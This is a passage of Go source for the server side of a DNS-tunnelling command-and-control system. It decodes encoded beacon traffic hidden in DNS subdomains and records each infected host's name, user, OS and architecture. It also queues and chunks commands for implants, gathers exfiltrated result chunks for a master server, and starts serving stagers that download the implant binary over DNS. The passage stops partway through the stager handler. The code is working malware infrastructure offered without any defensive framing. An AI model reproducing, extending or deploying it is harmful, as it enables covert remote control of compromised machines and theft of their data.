// stripDecorators extracts data characters from formatted DNS labels using a payload format template.
// The format uses 'X' for data positions, '.' for label separators, and everything else as decorators to strip.
// Returns extracted data string. If subdomain is shorter than format expects, extracts what's available.
func stripTrailingTimestamp(fields *[]string) {
	f := *fields
	if len(f) == 0 {
		return
	}
	last := f[len(f)-1]
	if len(last) >= 5 && len(last) <= 11 {
		allDigits := true
		for _, c := range last {
			if c < '0' || c > '9' {
				allDigits = false
				break
			}
		}
		if allDigits {
			*fields = f[:len(f)-1]
		}
	}
}

func stripDecorators(payloadParts []string, format string) string {
	if format == "" {
		return strings.Join(payloadParts, "")
	}

	fullSubdomain := strings.Join(payloadParts, ".")

	// Walk format and subdomain together until either is exhausted.
	// The client may produce a subdomain shorter than the full template (no padding),
	// so we stop as soon as either side runs out rather than requiring equal lengths.
	var data strings.Builder
	fi := 0
	si := 0

	for fi < len(format) && si < len(fullSubdomain) {
		fch := format[fi]
		if fch == 'X' {
			data.WriteByte(fullSubdomain[si])
			fi++
			si++
		} else {
			// Decorator or dot — skip both format position and subdomain position
			fi++
			si++
		}
	}

	return data.String()
}

// deliverAction captures post-unlock work that callers must execute after deliverNextTask returns.
type deliverAction struct {
	masterID      string
	beaconID      string
	taskID        string
	fireAndForget bool
}

func (a *deliverAction) execute() {
	if a == nil || a.masterID == "" || masterClient == nil {
		return
	}
	if a.fireAndForget {
		go masterClient.MarkTaskComplete(a.masterID, a.beaconID, 0)
	} else {
		if err := masterClient.MarkTaskDeliveredFast(a.masterID); err != nil {
			logf("[C2] MarkTaskDelivered failed for %s (will retry async): %v", a.taskID, err)
			go masterClient.MarkTaskDelivered(a.masterID)
		}
	}
}

// deliverNextTask checks the beacon's task queue and delivers the next available task.
// Tasks stay in the queue with status "sent" until RESULT_META confirms receipt, so a
// lost DNS response triggers automatic re-delivery on the next poll.
// When peekOnly is true, signals task-pending without dequeuing (for A-record poll probes).
// MUST be called with c2.mutex held; unlocks via defer.
// Callers MUST call action.execute() on the returned deliverAction after this returns.
func (c2 *C2Manager) deliverNextTask(beacon *Beacon, encrypted bool, peekOnly ...bool) (string, bool, bool, *deliverAction) {
	defer c2.mutex.Unlock()

	peek := len(peekOnly) > 0 && peekOnly[0]

	if peek && len(beacon.TaskQueue) > 0 {
		task := &beacon.TaskQueue[0]
		if taskPtr, exists := c2.tasks[task.ID]; exists && (taskPtr.Status == "completed" || taskPtr.Status == "failed") {
			beacon.TaskQueue = beacon.TaskQueue[1:]
			return "ACK", true, encrypted, nil
		}
		return "TASK_PENDING", true, encrypted, nil
	}
	if len(beacon.TaskQueue) > 0 {
		task := &beacon.TaskQueue[0]

		// If task was completed/failed via Master sync, drain it
		if taskPtr, exists := c2.tasks[task.ID]; exists && (taskPtr.Status == "completed" || taskPtr.Status == "failed") {
			beacon.TaskQueue = beacon.TaskQueue[1:]
			return "ACK", true, encrypted, nil
		}

		// SHADOW MESH: another server delivered this task — skip
		if _, inProgress := c2.tasksInProgress[task.ID]; inProgress && task.Status != "sent" {
			beacon.TaskQueue = beacon.TaskQueue[1:]
			if c2.debug {
				logf("[C2] Skipping task %s for beacon %s - already in progress via another server", task.ID, beacon.ID)
			}
			return "ACK", true, encrypted, nil
		}

		var taskResponse string
		var isChunked bool
		if len(task.Command) > MaxTaskChunkPayload {
			totalChunks := (len(task.Command) + MaxTaskChunkPayload - 1) / MaxTaskChunkPayload
			chunk1 := task.Command[:MaxTaskChunkPayload]
			taskResponse = fmt.Sprintf("TASKC|%s|1/%d|%s", task.ID, totalChunks, chunk1)
			isChunked = true

			ctKey := fmt.Sprintf("%s:%s", beacon.ID, task.ID)
			c2.chunkedTasks[ctKey] = &ChunkedTaskState{
				TaskID:      task.ID,
				Command:     task.Command,
				TotalChunks: totalChunks,
				DeliveredAt: time.Now(),
			}

			if c2.debug {
				logf("[C2] Chunked task %s for beacon %s: %d chunks (%d bytes)",
					task.ID, beacon.ID, totalChunks, len(task.Command))
			}
		} else {
			taskResponse = fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
		}
		_ = isChunked

		now := time.Now()
		c2.tasksInProgress[task.ID] = now
		beacon.CurrentTask = task.ID

		// Fire-and-forget tasks: client executes these but never sends a result back.
		// Dequeue immediately on first delivery so the task queue isn't blocked.
		fireAndForget := strings.HasPrefix(task.Command, "update_domains:")

		if task.Status != "sent" {
			task.Status = "sent"
			task.SentAt = &now
			if taskPtr, exists := c2.tasks[task.ID]; exists {
				taskPtr.Status = "sent"
				taskPtr.SentAt = &now
			}

			logf("[C2] Sending task %s to beacon %s: %s", task.ID, beacon.ID, task.Command)

			if fireAndForget {
				beacon.TaskQueue = beacon.TaskQueue[1:]
				beacon.CurrentTask = ""
				if taskPtr, exists := c2.tasks[task.ID]; exists {
					taskPtr.Status = "completed"
				}
				if c2.db != nil {
					go c2.db.UpdateTaskStatus(task.ID, "completed")
				}
			}

			if c2.db != nil && !fireAndForget {
				go func(t Task) {
					if err := c2.db.SaveTask(&t); err != nil && c2.debug {
						logf("[DB] Failed to update task status: %v", err)
					}
				}(*task)
			}

			var action *deliverAction
			if masterClient != nil {
				if masterID, ok := c2.masterTaskIDs[task.ID]; ok {
					action = &deliverAction{
						masterID:      masterID,
						beaconID:      beacon.ID,
						taskID:        task.ID,
						fireAndForget: fireAndForget,
					}
				}
			}

			return taskResponse, true, encrypted, action
		} else if fireAndForget {
			beacon.TaskQueue = beacon.TaskQueue[1:]
			beacon.CurrentTask = ""
		} else {
			if c2.debug {
				logf("[C2] Re-delivering task %s to beacon %s", task.ID, beacon.ID)
			}
		}

		return taskResponse, true, encrypted, nil
	}
	return "ACK", true, encrypted, nil
}

// processBeaconQuery handles incoming DNS queries from beacons
// processBeaconQuery parses an incoming DNS query from a beacon or stager.
// queryType is the DNS record type (1=A, 16=TXT) to enable A-record peek mode.
// Returns (response, isC2, encrypted) — encrypted=false means respond with plain base36.
// If info is non-nil, it is populated with the beacon ID and message type for the caller.
func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string, info *C2QueryInfo, queryType ...uint16) (string, bool, bool) {
	dnsQueryType := uint16(16) // default TXT
	if len(queryType) > 0 {
		dnsQueryType = queryType[0]
	}
	// encrypted tracks whether the response should be AES-GCM encoded.
	// Starts true; set to false for plain-base36 beacons and all stager traffic.
	encrypted := true

	// Check if query matches our domain
	if !strings.HasSuffix(qname, c2.domain) {
		if c2.debug {
			logf("[C2] Domain mismatch: query=%q server domain=%q", qname, c2.domain)
		}
		return "", false, true
	}

	// Extract payload (subdomain)
	parts := strings.Split(qname, ".")
	if len(parts) < 3 {
		return "", false, true
	}

	// Payload is everything before the domain
	// e.g. payload.timestamp.domain.com -> payload (strip timestamp too)
	// Format: <base36_data>[.<more_data>].<timestamp>.<domain>
	domainParts := strings.Split(c2.domain, ".")
	payloadParts := parts[:len(parts)-len(domainParts)]

	// SHADOW MESH: Stagers include a timestamp label for cache busting
	// Format: payload.timestamp.domain or payload1.payload2.timestamp.domain
	// We need to strip the timestamp (last numeric label before domain)
	// NOTE: Only stagers add this separate DNS label; beacons embed the timestamp
	// inside the encrypted payload. We try with the label stripped first, and if
	// decoding fails, retry with it restored (prevents false-positive stripping
	// when a beacon's last base36 label happens to be all digits).
	var strippedTimestamp string
	if len(payloadParts) >= 2 {
		lastPart := payloadParts[len(payloadParts)-1]
		if len(lastPart) >= 5 && len(lastPart) <= 11 {
			isTimestamp := true
			for _, c := range lastPart {
				if c < '0' || c > '9' {
					isTimestamp = false
					break
				}
			}
			if isTimestamp {
				strippedTimestamp = lastPart
				payloadParts = payloadParts[:len(payloadParts)-1]
			}
		}
	}

	// Try default decode first (join labels without stripping decorators)
	encodedPayload := strings.Join(payloadParts, "")

	// beaconPrefixes lists message types that identify an unencrypted beacon query.
	beaconPrefixes := []string{"CHK|", "CHK_META|", "POLL|", "DATA|", "RESULT_META|", "RESULT_COMPLETE|", "RESULT|", "TASKGET|", "STATUS|"}

	// isKnownBeaconOrStager reports whether s starts with a recognised protocol prefix.
	isKnownBeaconOrStager := func(s string) bool {
		if strings.HasPrefix(s, "STG|") || strings.HasPrefix(s, "CHUNK|") {
			return true
		}
		for _, pfx := range beaconPrefixes {
			if strings.HasPrefix(s, pfx) {
				return true
			}
		}
		return false
	}

	// Decode payload - try encrypted first (for beacons), then plain base36 (for stagers)
	decoded, err := c2.decodeBeaconData(encodedPayload)

	// If decode failed and we stripped a timestamp label, the label might have been
	// part of the beacon's encoded payload (not a real stager timestamp). Retry with
	// the label restored before moving to more expensive decorator-stripping paths.
	if err != nil && strippedTimestamp != "" {
		restoredPayload := encodedPayload + strippedTimestamp
		if candidate, retryErr := c2.decodeBeaconData(restoredPayload); retryErr == nil {
			decoded = candidate
			err = nil
			if c2.debug {
				logf("[C2] Decoded after restoring falsely-stripped timestamp label")
			}
		}
	}

	if err != nil {
		// Default decode failed — try stripping decorators with known beacon formats.
		// Deduplicate by PayloadFormat so we only run AES/base36 once per unique format,
		// avoiding O(n_beacons × AES_cost) when many beacons share the same format.
		c2.mutex.RLock()
		seenFormats := make(map[string]bool, len(c2.beacons)+len(c2.buildFormats))
		hasBase36Format := make(map[string]bool)
		for _, beacon := range c2.beacons {
			if beacon.PayloadFormat != "" {
				seenFormats[beacon.PayloadFormat] = true
				if beacon.Encoding == "base36" {
					hasBase36Format[beacon.PayloadFormat] = true
				}
			}
		}
		for fmt := range c2.buildFormats {
			seenFormats[fmt] = true
			hasBase36Format[fmt] = true
		}
		for format := range seenFormats {
			stripped := stripDecorators(payloadParts, format)
			candidate, decErr := c2.decodeBeaconData(stripped)
			if decErr == nil {
				decoded = candidate
				err = nil
				break
			}
			// Also try plain base36 after stripping (for unencrypted beacons with decorators)
			if hasBase36Format[format] {
				plainCandidate, plainErr := base36DecodeString(stripped)
				if plainErr == nil && isKnownBeaconOrStager(plainCandidate) {
					decoded = plainCandidate
					err = nil
					encrypted = false
					break
				}
			}
		}
		c2.mutex.RUnlock()
	}

	if err != nil {
		// AES-GCM decryption failed — try plain base36 (stager or unencrypted beacon)
		if c2.debug {
			logf("[C2] AES-GCM decrypt failed (payload len=%d): %v", len(encodedPayload), err)
		}
		decoded, err = base36DecodeString(encodedPayload)
		// If base36 decoded but isn't a recognised protocol message, and we stripped a
		// timestamp label earlier, retry with the label restored.
		if err == nil && !isKnownBeaconOrStager(decoded) && strippedTimestamp != "" {
			if candidate, retryErr := base36DecodeString(encodedPayload + strippedTimestamp); retryErr == nil && isKnownBeaconOrStager(candidate) {
				decoded = candidate
			}
		}
		if err != nil && strippedTimestamp != "" {
			if candidate, retryErr := base36DecodeString(encodedPayload + strippedTimestamp); retryErr == nil && isKnownBeaconOrStager(candidate) {
				decoded = candidate
				err = nil
			}
		}
		if err != nil {
			if c2.debug {
				logf("[C2] Plain base36 decode also failed: %v", err)
			}
			// Payload may contain decorator chars (hyphens etc.) from a PayloadFormat —
			// try decorator stripping + plain base36 as a last resort.
			// Deduplicate formats here too to avoid redundant work.
			c2.mutex.RLock()
			lastResortFormats := make(map[string]bool, len(c2.beacons)+len(c2.buildFormats))
			for _, beacon := range c2.beacons {
				if beacon.PayloadFormat != "" {
					lastResortFormats[beacon.PayloadFormat] = true
				}
			}
			for fmt := range c2.buildFormats {
				lastResortFormats[fmt] = true
			}
			for format := range lastResortFormats {
				stripped := stripDecorators(payloadParts, format)
				candidate, plainErr := base36DecodeString(stripped)
				if plainErr == nil && isKnownBeaconOrStager(candidate) {
					if c2.debug {
						logf("[C2] Decoded via decorator-strip+base36 (format len=%d): %s", len(format), candidate[:min(30, len(candidate))])
					}
					decoded = candidate
					err = nil
					encrypted = false
					break
				}
			}
			c2.mutex.RUnlock()

			if err != nil {
				return "", false, true
			}
		}

		if !isKnownBeaconOrStager(decoded) {
			if c2.debug {
				preview := decoded
				if len(preview) > 20 {
					preview = preview[:20]
				}
				logf("[C2] Unrecognised payload after all decode attempts (prefix=%q, len=%d) — rejecting", preview, len(decoded))
			}
			return "", false, true
		}

		// Plain-decoded traffic is always unencrypted (either unencrypted beacon or stager)
		encrypted = false
		if c2.debug {
			isStager := strings.HasPrefix(decoded, "STG|") || strings.HasPrefix(decoded, "CHUNK|")
			if isStager {
				logf("[C2] Decoded stager message (plain base36): %s (from %s)", decoded, clientIP)
			} else {
				logf("[C2] Decoded unencrypted beacon message (plain base36): %s (from %s)", decoded, clientIP)
			}
		}
	} else {
		if c2.debug {
			logf("[C2] Decoded beacon message: %s (from %s)", decoded, clientIP)
		}
	}

	// Parse beacon data - STRICTLY pipe-delimited for DNS C2
	// Format: TYPE|DATA...
	msgParts := strings.Split(decoded, "|")
	if len(msgParts) < 2 {
		if c2.debug {
			logf("[C2] Invalid payload format (too short)")
		}
		return "", false, true
	}

	msgType := msgParts[0]

	// Populate caller metadata early so dedup'd messages still get phase-aware IP selection
	if info != nil {
		info.MsgType = msgType
		if len(msgParts) >= 2 {
			info.BeaconID = msgParts[1]
		}
	}

	// Deduplication: check if we've recently processed this exact message
	// Skip dedup for CHK (check-in) and STG (stager) messages which must be processed each time
	if msgType != "CHK" && msgType != "POLL" && msgType != "STG" && msgType != "CHUNK" && msgType != "TASKGET" {
		msgHash := fmt.Sprintf("%x", sha256.Sum256([]byte(decoded)))
		c2.mutex.RLock()
		if _, seen := c2.recentMessages[msgHash]; seen {
			c2.mutex.RUnlock()
			if c2.debug {
				logf("[C2] Duplicate message detected (hash=%s), returning cached ACK", msgHash[:16])
			}
			return "ACK", true, encrypted
		}
		c2.mutex.RUnlock()

		// Record this message as recently seen for deduplication
		c2.mutex.Lock()
		c2.recentMessages[msgHash] = time.Now()
		c2.mutex.Unlock()
	}

	// If this message decoded as plain-base36 (unencrypted beacon), ensure the beacon's
	// Encoding field is current so subsequent queries hit the optimised decorator-strip path
	// instead of the last-resort loop. The CHK handler sets this on first check-in; here we
	// catch DATA/RESULT messages that arrive before or after Encoding was set.
	if !encrypted && len(msgParts) >= 2 {
		if probeID := msgParts[1]; probeID != "" {
			c2.mutex.Lock()
			if b, exists := c2.beacons[probeID]; exists && b.Encoding == "" {
				b.Encoding = "base36"
			}
			c2.mutex.Unlock()
		}
	}

	// Common variables
	var beaconID string

	switch msgType {
	case "CHK":
		// Unstaged: CHK|id|hostname|username|os|arch[|buildID]|timestamp
		// Staged:   CHK|id|S1|buildID|timestamp
		//           CHK|id|S2|hostname|os|timestamp
		//           CHK|id|S3|username|arch|timestamp
		if len(msgParts) < 4 {
			return "", false, true
		}
		beaconID = msgParts[1]

		var hostname, username, osType, arch, beaconName string
		var regStage *int

		// Detect staged registration by checking for S1/S2/S3 marker at position 2
		stageMarker := msgParts[2]
		switch stageMarker {
		case "S1":
			// CHK|id|S1|buildID|timestamp
			s := 1
			regStage = &s
			if len(msgParts) > 3 {
				extra := msgParts[3:]
				stripTrailingTimestamp(&extra)
				if len(extra) > 0 {
					beaconName = extra[0]
				}
			}
		case "S2":
			// CHK|id|S2|hostname|os|timestamp
			s := 2
			regStage = &s
			if len(msgParts) > 3 {
				extra := msgParts[3:]
				stripTrailingTimestamp(&extra)
				if len(extra) >= 1 {
					hostname = extra[0]
				}
				if len(extra) >= 2 {
					osType = extra[1]
				}
			}
		case "S3":
			// CHK|id|S3|username|arch|timestamp
			s := 3
			regStage = &s
			if len(msgParts) > 3 {
				extra := msgParts[3:]
				stripTrailingTimestamp(&extra)
				if len(extra) >= 1 {
					username = extra[0]
				}
				if len(extra) >= 2 {
					arch = extra[1]
				}
			}
		default:
			// Unstaged: CHK|id|hostname|username|os|arch[|buildID]|timestamp
			if len(msgParts) < 6 {
				return "", false, true
			}
			hostname = msgParts[2]
			username = msgParts[3]
			osType = msgParts[4]
			arch = msgParts[5]
			extraFields := msgParts[6:]
			stripTrailingTimestamp(&extraFields)
			if len(extraFields) >= 1 {
				beaconName = extraFields[0]
			}
		}

		c2.mutex.Lock()
		now := time.Now()
		beacon, exists := c2.beacons[beaconID]

		beaconEncoding := ""
		if !encrypted {
			beaconEncoding = "base36"
		}

		if !exists {
			newRegStage := regStage
			if regStage != nil && *regStage == 3 {
				newRegStage = nil
			}
			beacon = &Beacon{
				ID:                beaconID,
				Hostname:          hostname,
				Username:          username,
				OS:                osType,
				Arch:              arch,
				FirstSeen:         now,
				LastSeen:          now,
				IPAddress:         clientIP,
				BeaconName:        beaconName,
				BuildID:           beaconName,
				Encoding:          beaconEncoding,
				RegistrationStage: newRegStage,
				TaskQueue:         []Task{},
			}
			// Apply cached build phase config if available (pushed by Archon via checkin)
			if key := beacon.buildConfigKey(); key != "" {
				if pc, ok := c2.buildPhaseConfigs[key]; ok {
					beacon.PhaseConfig = pc
				}
			}
			c2.beacons[beaconID] = beacon
			if regStage != nil {
				logf("[C2] New beacon registered (stage S%d): %s from %s", *regStage, beacon.ID, clientIP)
			} else {
				logf("[C2] New beacon registered: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
			}

			if c2.db != nil {
				if err := c2.db.SaveBeacon(beacon); err != nil {
					logf("[DB] Failed to save new beacon: %v", err)
				}
			}

			if masterClient != nil {
				snap := *beacon
				go masterClient.ReportBeacon(&snap)
			}
		} else {
			beacon.LastSeen = now
			beacon.IPAddress = clientIP
			// Merge non-empty fields (staged registration sends fields across multiple queries)
			if hostname != "" {
				beacon.Hostname = hostname
			}
			if username != "" {
				beacon.Username = username
			}
			if osType != "" {
				beacon.OS = osType
			}
			if arch != "" {
				beacon.Arch = arch
			}
			if beaconName != "" {
				beacon.BeaconName = beaconName
			}
			if !encrypted {
				beacon.Encoding = "base36"
			}
			if regStage != nil && *regStage == 3 {
				beacon.RegistrationStage = nil
			} else {
				beacon.RegistrationStage = regStage
			}

			if beacon.PhaseConfig == nil {
				if key := beacon.buildConfigKey(); key != "" {
					if pc, ok := c2.buildPhaseConfigs[key]; ok {
						beacon.PhaseConfig = pc
					}
				}
			}

			if c2.db != nil {
				go func(id string) {
					if err := c2.db.UpdateBeaconStatus(id, "active"); err != nil && c2.debug {
						logf("[DB] Failed to update beacon status: %v", err)
					}
				}(beacon.ID)
			}

			if masterClient != nil {
				snap := *beacon
				go masterClient.ReportBeacon(&snap)
			}
		}

		// For A-record CHK queries, use peek mode (don't deliver task inline)
		peekMode := dnsQueryType == 1 && beacon.PhaseConfig != nil && beacon.PhaseConfig.RegQueryType == "A"
		resp, hasTask, enc, action := c2.deliverNextTask(beacon, encrypted, peekMode)
		action.execute()
		return resp, hasTask, enc

	case "CHK_META":
		// CHK_META|beaconID|beaconName|payloadFormat
		if len(msgParts) < 3 {
			return "", false, true
		}
		beaconID = msgParts[1]
		metaBeaconName := msgParts[2]
		metaPayloadFmt := ""
		if len(msgParts) >= 4 {
			metaPayloadFmt = msgParts[3]
		}

		c2.mutex.Lock()
		beacon, exists := c2.beacons[beaconID]
		if !exists {
			c2.mutex.Unlock()
			return "REREG", true, encrypted
		}

		if metaBeaconName != "" {
			beacon.BeaconName = metaBeaconName
		}
		if metaPayloadFmt != "" {
			beacon.PayloadFormat = metaPayloadFmt
		}

		if beacon.PhaseConfig == nil {
			if key := beacon.buildConfigKey(); key != "" {
				if pc, ok := c2.buildPhaseConfigs[key]; ok {
					beacon.PhaseConfig = pc
				}
			}
		}

		beacon.LastSeen = time.Now()
		beacon.IPAddress = clientIP
		var snap Beacon
		if masterClient != nil {
			snap = *beacon
		}
		c2.mutex.Unlock()

		if c2.db != nil {
			go func(id string) {
				if err := c2.db.UpdateBeaconStatus(id, "active"); err != nil && c2.debug {
					logf("[DB] Failed to update beacon status: %v", err)
				}
			}(beacon.ID)
		}

		if masterClient != nil {
			go masterClient.ReportBeacon(&snap)
		}

		return "ACK", true, encrypted

	case "POLL":
		// POLL|beaconID|timestamp — lightweight check-in after first CHK
		if len(msgParts) < 2 {
			return "", false, true
		}
		beaconID = msgParts[1]

		c2.mutex.Lock()
		beacon, exists := c2.beacons[beaconID]
		if !exists {
			c2.mutex.Unlock()
			logf("[C2] POLL from unknown beacon %s (from %s) — sending REREG", beaconID, clientIP)
			return "REREG", true, encrypted
		}

		beacon.LastSeen = time.Now()
		beacon.IPAddress = clientIP
		beacon.RegistrationStage = nil
		logf("[C2] Beacon %s polled from %s", beaconID, clientIP)

		if beacon.PhaseConfig == nil {
			if key := beacon.buildConfigKey(); key != "" {
				if pc, ok := c2.buildPhaseConfigs[key]; ok {
					beacon.PhaseConfig = pc
				}
			}
		}

		if c2.db != nil {
			go func(id string) {
				if err := c2.db.UpdateBeaconStatus(id, "active"); err != nil && c2.debug {
					logf("[DB] Failed to update beacon status: %v", err)
				}
			}(beacon.ID)
		}

		if masterClient != nil {
			snap := *beacon
			go masterClient.ReportBeacon(&snap)
		}

		// For A-record POLL queries, use peek mode — signal task-pending without dequeuing
		// Client will follow up with a TXT query to retrieve the actual task
		peekMode := dnsQueryType == 1 && beacon.PhaseConfig != nil && beacon.PhaseConfig.PollQueryType == "A"
		resp, hasTask, enc, action := c2.deliverNextTask(beacon, encrypted, peekMode)
		action.execute()
		return resp, hasTask, enc

	case "TASKGET":
		// TASKGET|beaconID|taskID|chunkIndex — client requesting a specific chunk
		if len(msgParts) < 4 {
			return "", false, true
		}
		beaconID = msgParts[1]
		taskID := msgParts[2]
		chunkIndex, _ := strconv.Atoi(msgParts[3])

		c2.mutex.Lock()
		if beacon, exists := c2.beacons[beaconID]; exists {
			beacon.LastSeen = time.Now()
		}

		ctKey := fmt.Sprintf("%s:%s", beaconID, taskID)
		state, found := c2.chunkedTasks[ctKey]
		if !found {
			if task, tExists := c2.tasks[taskID]; tExists && len(task.Command) > MaxTaskChunkPayload {
				totalChunks := (len(task.Command) + MaxTaskChunkPayload - 1) / MaxTaskChunkPayload
				state = &ChunkedTaskState{
					TaskID:      taskID,
					Command:     task.Command,
					TotalChunks: totalChunks,
					DeliveredAt: time.Now(),
				}
				c2.chunkedTasks[ctKey] = state
				found = true
			}
		}
		c2.mutex.Unlock()

		if !found {
			return "ACK", true, encrypted
		}

		if chunkIndex < 1 || chunkIndex > state.TotalChunks {
			return "ACK", true, encrypted
		}

		start := (chunkIndex - 1) * MaxTaskChunkPayload
		end := start + MaxTaskChunkPayload
		if end > len(state.Command) {
			end = len(state.Command)
		}
		chunkData := state.Command[start:end]

		if c2.debug {
			logf("[C2] TASKGET %s chunk %d/%d for beacon %s (%d bytes)",
				taskID, chunkIndex, state.TotalChunks, beaconID, len(chunkData))
		}

		return fmt.Sprintf("TASKC|%s|%d/%d|%s", taskID, chunkIndex, state.TotalChunks, chunkData), true, encrypted

	case "STATUS":
		// STATUS|beaconID|status — lightweight status update (e.g., "exfiltrating", "active")
		if len(msgParts) < 3 {
			return "", false, true
		}
		beaconID = msgParts[1]
		newStatus := msgParts[2]

		c2.mutex.Lock()
		beacon, exists := c2.beacons[beaconID]
		if exists {
			beacon.LastSeen = time.Now()
		}
		c2.mutex.Unlock()

		if !exists {
			return "ACK", true, encrypted
		}

		if c2.db != nil {
			go func(id, st string) {
				if err := c2.db.UpdateBeaconStatus(id, st); err != nil && c2.debug {
					logf("[DB] Failed to update beacon status: %v", err)
				}
			}(beaconID, newStatus)
		}

		if masterClient != nil {
			go masterClient.ReportBeaconStatus(beaconID, newStatus)
		}

		return "ACK", true, encrypted

	case "RESULT_META":
		// RESULT_META|id|taskID|len|chunks|timestamp
		if len(msgParts) < 5 {
			return "", false, true
		}
		beaconID = msgParts[1]
		taskID := msgParts[2]
		totalSize, _ := strconv.Atoi(msgParts[3])
		totalChunks, _ := strconv.Atoi(msgParts[4])

		c2.mutex.Lock()
		if _, inProgress := c2.tasksInProgress[taskID]; !inProgress {
			c2.tasksInProgress[taskID] = time.Now()
		}

		// Dequeue task from beacon's queue — confirms beacon received it
		if beacon, bExists := c2.beacons[beaconID]; bExists {
			if len(beacon.TaskQueue) > 0 && beacon.TaskQueue[0].ID == taskID {
				beacon.TaskQueue = beacon.TaskQueue[1:]
			}
		}

		// Clean up chunked delivery state — client has the full command
		delete(c2.chunkedTasks, fmt.Sprintf("%s:%s", beaconID, taskID))

		// Track metadata locally (for totalChunks lookup and logging)
		if _, exists := c2.expectedResults[taskID]; !exists {
			c2.expectedResults[taskID] = &ExpectedResult{
				BeaconID:       beaconID,
				TaskID:         taskID,
				TotalSize:      totalSize,
				TotalChunks:    totalChunks,
				ReceivedAt:     time.Now(),
				ReceivedData:   make([]string, totalChunks),
				ReceivedChunks: make(map[int]bool),
			}
			if c2.debug {
				logf("[C2] Expecting result for task %s: %d chunks, %d bytes", taskID, totalChunks, totalSize)
			}
		}
		c2.mutex.Unlock()

		// Forward metadata to Master so it knows to expect chunks
		// SHADOW MESH: Forward from any DNS server, not just the one that delivered the task
		if masterClient != nil {
			go masterClient.SubmitResult(taskID, beaconID, 0, totalChunks, "")
		}

		return "ACK", true, encrypted

	case "DATA":
		// DATA|beaconID|taskID|chunkIndex|totalChunks|chunkData|timestamp
		// chunkIndex is 1-indexed, included by beacon for deduplication
		// Use SplitN to preserve pipes in chunk data
		dataParts := strings.SplitN(decoded, "|", 6)
		if len(dataParts) < 6 {
			return "", false, true
		}

		// The last part contains "chunkData|timestamp"
		lastPart := dataParts[5]
		lastPipeIdx := strings.LastIndex(lastPart, "|")
		if lastPipeIdx == -1 {
			return "", false, true
		}

		chunkData := lastPart[:lastPipeIdx]
		beaconID = dataParts[1]
		taskID := dataParts[2]
		chunkIndex, _ := strconv.Atoi(dataParts[3])
		totalChunks, _ := strconv.Atoi(dataParts[4])

		// Mark task as in-progress
		c2.mutex.Lock()
		if _, inProgress := c2.tasksInProgress[taskID]; !inProgress {
			c2.tasksInProgress[taskID] = time.Now()
		}

		// Initialize expectedResults if not exists
		if _, exists := c2.expectedResults[taskID]; !exists {
			c2.expectedResults[taskID] = &ExpectedResult{
				BeaconID:       beaconID,
				TaskID:         taskID,
				TotalChunks:    totalChunks,
				ReceivedAt:     time.Now(),
				ReceivedData:   make([]string, totalChunks),
				LastChunkIndex: 0,
				ReceivedChunks: make(map[int]bool),
			}
		}
		expected := c2.expectedResults[taskID]

		// Initialize ReceivedChunks if nil (defensive - shouldn't happen but just in case)
		if expected.ReceivedChunks == nil {
			expected.ReceivedChunks = make(map[int]bool)
		}

		// Check for duplicate chunk - if already received, ACK but don't forward
		if expected.ReceivedChunks[chunkIndex] {
			c2.mutex.Unlock()
			if c2.debug {
				logf("[C2] Duplicate chunk %d/%d for task %s - already forwarded, skipping", chunkIndex, totalChunks, taskID)
			}
			return "ACK", true, encrypted
		}

		// Mark chunk as received and reset timeout
		expected.ReceivedAt = time.Now()
		expected.ReceivedChunks[chunkIndex] = true
		if chunkIndex > expected.LastChunkIndex {
			expected.LastChunkIndex = chunkIndex
		}
		// Update totalChunks if we have it now (in case RESULT_META was missed)
		if totalChunks > 0 && expected.TotalChunks == 0 {
			expected.TotalChunks = totalChunks
		}
		c2.mutex.Unlock()

		if c2.debug {
			logf("[C2] Received chunk %d/%d for task %s - forwarding to Master", chunkIndex, totalChunks, taskID)
		}

		// Forward chunk to Master immediately - Master handles all assembly
		// SHADOW MESH: Results may arrive at any DNS server, not just the one that delivered the task
		// Task IDs from beacons ARE master task IDs, so forward directly
		if masterClient != nil {
			go masterClient.SubmitResult(taskID, beaconID, chunkIndex, totalChunks, chunkData)
		}

		return "ACK", true, encrypted

	case "RESULT_COMPLETE":
		// RESULT_COMPLETE|id|taskID|totalChunks|timestamp
		if len(msgParts) < 4 {
			return "", false, true
		}
		beaconID = msgParts[1]
		taskID := msgParts[2]
		totalChunksFromMsg, _ := strconv.Atoi(msgParts[3])

		// Clean up local tracking state (no local assembly - Master handles it)
		c2.mutex.Lock()
		expected, ok := c2.expectedResults[taskID]
		var totalChunks int
		if ok {
			totalChunks = expected.TotalChunks
			delete(c2.expectedResults, taskID)
		} else {
			totalChunks = totalChunksFromMsg
		}

		// Clean up in-progress tracking
		delete(c2.tasksInProgress, taskID)

		// Update local task status and clear beacon's current task
		if task, taskExists := c2.tasks[taskID]; taskExists {
			task.Status = "completed"
			if beacon, exists := c2.beacons[beaconID]; exists {
				// Dequeue if still in queue (safety net if RESULT_META was lost)
				if len(beacon.TaskQueue) > 0 && beacon.TaskQueue[0].ID == taskID {
					beacon.TaskQueue = beacon.TaskQueue[1:]
				}
				if beacon.CurrentTask == taskID {
					beacon.CurrentTask = ""
				}
			}
		}
		c2.mutex.Unlock()

		logf("[C2] Result complete for task %s (%d chunks) - forwarding to Archon", taskID, totalChunks)

		// Update local DB status (result will come from Master sync later)
		if c2.db != nil {
			go c2.db.UpdateTaskStatus(taskID, "completed")
		}

		// Forward completion to Master - Master assembles from chunks received from all DNS servers
		// SHADOW MESH: Forward from any DNS server, not just the one that delivered the task
		if masterClient != nil {
			go masterClient.MarkTaskComplete(taskID, beaconID, totalChunks)
		}

		return "ACK", true, encrypted

	case "STG":
		// STG|IP|OS|ARCH|timestamp - Stager initialization request
		if len(msgParts) < 4 {
			return "", false, true
		}
		stagerIP := msgParts[1]
		osType := msgParts[2]
		arch := msgParts[3]

		logf("[Stager] Init request from %s (os=%s, arch=%s)", stagerIP, osType, arch)

		// Check local cache first - if we have chunks cached, use them
		var clientBinaryID string
		var totalChunks int
		var hasCached bool
		if c2.db != nil {
			clientBinaryID, totalChunks, hasCached = c2.db.GetCachedBinaryInfo()
		}
		if hasCached && totalChunks > 0 {
			// Generate deterministic session ID from stagerIP + clientBinaryID
			// This ensures all DNS servers use the same session ID for the same stager
			sessionID := generateDeterministicSessionID(stagerIP, clientBinaryID)

			// Store session locally
			c2.stagerMutex.Lock()
			c2.stagerSessions[stagerIP] = &StagerSession{
				ClientIP:       stagerIP,
				SessionID:      sessionID,
				ClientBinaryID: clientBinaryID,
				OS:             osType,
				Arch:           arch,
				TotalChunks:    totalChunks,
				DeliveredCount: 0,
